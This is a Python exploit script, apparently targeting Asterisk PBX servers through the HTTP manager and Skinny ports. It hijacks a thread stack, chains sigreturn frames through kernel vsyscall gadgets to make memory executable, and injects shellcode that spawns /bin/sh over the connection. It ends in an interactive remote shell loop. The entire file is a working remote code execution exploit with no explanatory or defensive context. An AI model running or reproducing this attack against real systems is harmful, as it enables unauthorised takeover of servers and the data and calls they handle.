#!/usr/bin/env python

import sys, socket, select, struct, time

http_port, skinny_port = 8088, 2000

host = ( sys.argv[1:] + ['127.0.0.1'] ) [0]

# Wheezy / Ubuntu 12.04
path = "/asterisk/manager"
kernel_version = '3.2'
ret_sled = 1400

# Centos 6
#path = "/manager"
#kernel_version = '2.6.32'
#ret_sled = 1800

sockfd = 34
writable_page = 0x7ba000
delay = .1

kernels = {
	'3.2' : {
		'syscall_ret' : 0xffffffffff600407, # syscall ; ret
		'ret' : 0xffffffffff600409,
		'segments' : 0x33,
	},
	'2.6.32' : {
		'syscall_ret' : 0xffffffffff600439, # syscall ; ... ; pop %rbx ; leaveq ; ret
		'ret' : 0xffffffffff600433,
		'segments' : 0x33,
		'leaveq' : True,
	}
}

def tcp_conn(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect( (host, port) )
    return s

def le32(addr):
	return ''.join( chr( (addr>>i)&0xff ) for i in range(0,32,8) )

def le64(addr):
    return "".join( chr( (addr>>shift) & 0xff ) for shift in xrange(0, 64, 8) )

def chunks(l, n):
	for i in xrange(0,len(l), n):
		yield l[i:i+n]

def insert_string(s, offset, ins):
	return s[:offset] + ins + s[offset+len(ins):]

def put_addr(s, offset, addr):
	return insert_string(s, offset, le64(addr))

def fill_up(s, size):
	return s+"A"*(size-len(s))

(
	UC_FLAGS, UC_LINK,
	SS_SP, SS_FLAGS,
	SS_SIZE, R8,
	R9, R10,
	R11, R12,
	R13, R14,
	R15, RDI,
	RSI, RBP,
	RBX, RDX,
	RAX, RCX,
	RSP, RIP,
	EFLAGS, SEGMENTS,
	ERR, TRAPNO,
	OLDMASK, CR2,
	FPSTATE, RESERVED1,

) = ( x*8 for x in range(30) ) # x86-64 ucontext

CONTEXT_SIZE = RESERVED1 + 8

PROT_READ, PROT_WRITE, PROT_EXEC = 1, 2, 4

SYS_READ = 0
SYS_MPROTECT = 10
SYS_SIGRETURN = 15
SYS_EXECVE = 59
SYS_EXIT = 60
SYS_SYNCFS = 306

def get_syscall_srop(call, sp, kernel):
	arg_off = [RAX, RDI, RSI, RDX, R10, R8, R9]

	ucontext = "\0"*CONTEXT_SIZE
	for off, val in ( (UC_FLAGS, 1),
	                  (SS_FLAGS, 2),
	                  (RIP, kernel['syscall_ret']),
	                  (RBP, sp),
	                  (RSP, sp),
	                  (SEGMENTS, kernel['segments']) ):
		ucontext = put_addr(ucontext, off, val)

	for i, val in enumerate(call):
		ucontext = put_addr(ucontext, arg_off[i], val)

	return le64(kernel['syscall_ret']) + ucontext

def srop_stage1(sockfd, writable_page, kernel):
	ret_sp = writable_page+0x100
	return get_syscall_srop( [SYS_READ, sockfd, ret_sp, SYS_SYNCFS], ret_sp, kernel)

def srop_stage2(sockfd, writable_page, kernel):
	ret_sp = writable_page+0x100
	shellcode = '\x6a'+chr(sockfd)+\
		'5f6a025e6a21580f055648ffce79f5545a545e682f62696e545f816f04d18c97ff6a3b580f05'.decode('hex')

	if 'leaveq' in kernel and kernel['leaveq']:
		stage2 = le64(ret_sp)
		shell_sp = ret_sp-8
	else:
		stage2 = le64(kernel['syscall_ret'])*2
		shell_sp = ret_sp

	shellcode_off = len(stage2)+8+SS_SIZE
	shellcode_addr = ret_sp + shellcode_off
	if shellcode_off + len(shellcode) > 24+RDI:
		print "Error: shellcode too big %d vs. %d" % (len(shellcode), RDI-shellcode_off)
		sys.exit(1)

	stage2 += get_syscall_srop( [SYS_MPROTECT, writable_page, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC],
		                        shell_sp, kernel)

	stage2 = insert_string(stage2, shellcode_off, shellcode)
	stage2 = fill_up(stage2, SYS_SYNCFS) + le64(shellcode_addr) + stage2[8:SYS_SIGRETURN]
	return stage2

def request(path, hostname, content_length):
    return ("POST "+path+" HTTP/1.0\r\n"+
            "Host: "+hostname+"\r\n"+
            "Content-length: "+str(content_length)+"\r\n"+
            "\r\n")

def hijack_stack_insert_sigframe(frame, offset, kernel):
	jumper = tcp_conn(host, http_port)
	time.sleep(delay)
	owner = tcp_conn(host, skinny_port)
	owner.send(le32(SYS_SIGRETURN-4))
	time.sleep(delay)
	jumper.send(request(path, host, offset-0x25a0+0x2000)+le64(kernel['ret'])*ret_sled+frame+'\n')
	time.sleep(delay)
	owner.send("X"*SYS_SIGRETURN)
	jumper.close()
	time.sleep(delay)
	return owner

kernel = kernels[kernel_version]
stage1 = srop_stage1(sockfd, writable_page, kernel)
stage2 = srop_stage2(sockfd, writable_page, kernel)
exitframe = get_syscall_srop([SYS_EXIT], writable_page, kernel)

socks = []
N_SOCKS = 25
for i in range(1, N_SOCKS+1):
	if i == N_SOCKS:
		frame = stage1
	else:
		frame = exitframe
	socks.append(hijack_stack_insert_sigframe(frame, i*507904, kernel))
	sys.stdout.write(str(i)+'...')
	sys.stdout.flush()
print

time.sleep(.1)
for s in socks:
	try:
		s.send(stage2)
	except socket.error:
		break

time.sleep(.1)
for s in socks:
	try:
		s.send('id\n')
	except socket.error:
		pass

time.sleep(.1)
d = {}
for s in socks:
	d[s.fileno()] = s
r,_,_ = select.select(d.keys(), [], [])
s = d[r[0]]

# Async I/O
sockfd = s.fileno()
infd = sys.stdin.fileno()
waitlist = [sockfd, infd]

while len(waitlist) > 0:
    r,w,x = select.select(waitlist, [], [])
    if sockfd in r:
        rdata = s.recv(4096)
        if rdata == '':
            waitlist.remove(sockfd)
        sys.stdout.write(rdata)
        continue
    if infd in r:
        sdata = sys.stdin.readline()
        s.send(sdata)
        if sdata == '':
            s.shutdown(socket.SHUT_WR)
            waitlist.remove(infd)

